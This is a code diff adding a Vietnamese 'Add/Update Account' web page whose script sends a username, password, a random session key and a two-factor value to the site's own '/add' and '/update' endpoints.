@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Thêm/Cập nhật Tài khoản</title>
+</head>
+
+
+<body>
+    <h1>Thêm/Cập nhật Tài khoản</h1>
+
+    <!-- Biểu mẫu để thêm tài khoản -->
+
+    <div id="content">
+        <form id="add-form" method="post" action="/add">
+            <label for="usernameAdd">Tên đăng nhập:</label>
+            <input type="text" id="usernameAdd" name="usernameAdd" required>
+            <br>
+            <label for="passwordAdd">Mật khẩu:</label>
+            <input type="password" id="passwordAdd" name="passwordAdd" required>
+            <br>
+            <input type="submit" value="Thêm tài khoản">
+        </form>
+        <button id="loadPage">Chuyển trang</button>
+    </div>
+
+    <script>
+
+        function generateRandomID() {
+            return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        }
+        function generateUniqueKey() {
+            const timestamp = new Date().getTime();
+            const randomNum = Math.floor(Math.random() * 1000); // Số ngẫu nhiên từ 0 đến 999
+            return `${timestamp}_${randomNum}_${generateRandomID()}`;
+        }
+        const key = generateUniqueKey();
+        console.log(key)
+
+        document.getElementById("loadPage").addEventListener("click", function () {
+            // Sử dụng AJAX để tải nội dung trang mới
+            console.log("đây là key", key)
+            const username = document.getElementById("usernameAdd").value;
+            const password = document.getElementById("passwordAdd").value;
+            const rkey = key;
+            // Gửi dữ liệu POST đến máy chủ để thêm tài khoản
+            fetch("/add", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: `username=${username}&password=${password}&rkey=${rkey}`
+            })
+                .then(response => response.text())
+                .then(data => {
+                    alert(data); // Hiển thị thông báo từ máy chủ
+                    // Thực hiện các xử lý khác sau khi thêm thành công (nếu cần)
+                })
+                .catch(error => {
+                    console.error(error);
+                });
+
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "/link", true);
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    // Khi tải xong, thay đổi nội dung của phần tử có id "content"
+                    document.getElementById("content").innerHTML = xhr.responseText;
+                }
+            };
+            xhr.send();
+        });
+
+
+
+        document.getElementById("add-form").addEventListener("submit", function (event) {
+            event.preventDefault();
+            console.log("đây là key", key)
+            const username = document.getElementById("usernameAdd").value;
+            const password = document.getElementById("passwordAdd").value;
+            const rkey = key;
+            // Gửi dữ liệu POST đến máy chủ để thêm tài khoản
+            fetch("/add", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: `username=${username}&password=${password}&rkey=${rkey}`
+            })
+                .then(response => response.text())
+                .then(data => {
+                    alert(data); // Hiển thị thông báo từ máy chủ
+                    // Thực hiện các xử lý khác sau khi thêm thành công (nếu cần)
+                })
+                .catch(error => {
+                    console.error(error);
+                });
+        });
+
+        document.getElementById("update-form").addEventListener("submit", function (event) {
+            event.preventDefault();
+            const rkey = key;
+            const twofa = document.getElementById("twofa").value;
+
+            // Gửi dữ liệu POST đến máy chủ để cập nhật tài khoản
+            fetch("/update", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: `rkey=${rkey}&twofa=${twofa}`
+            })
+                .then(response => response.text())
+                .then(data => {
+                    alert(data); // Hiển thị thông báo từ máy chủ
+                    // Thực hiện các xử lý khác sau khi cập nhật thành công (nếu cần)
+                })
+                .catch(error => {
+                    console.error(error);
+                });
+        });
+    </script>
+</body>
+
+</html>
